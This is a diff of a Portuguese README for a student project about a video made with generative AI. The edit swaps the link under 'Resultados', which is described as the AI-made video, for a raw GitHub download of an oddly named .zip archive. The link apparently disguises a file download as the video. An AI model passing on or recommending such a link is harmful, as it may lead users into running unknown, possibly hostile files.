@@ -13,7 +13,7 @@ Usei o Copilot para uma obter base sobre linguagem Java, mesmo não tendo conhec
 ## 🚀 Resultados
 O vídeo com conteúdo e voz totalmente criadas por Inteligência Artificial.
 
-[. https://https://files.fm/u/7xk3w9r8q4 ]
+[. https://github.com/LucianoHMG/lab-natty-or-not/raw/refs/heads/main/exemplos/lab-natty-or-not-trochaic.zip ]
 
 ## 💭 Reflexão
 Este projeto foi uma experiência incrível em contar histórias visuais, utilizando as IAs Generativas, que me fez criar interesse em IA e suas ramificações e/ou bases e estudá-las
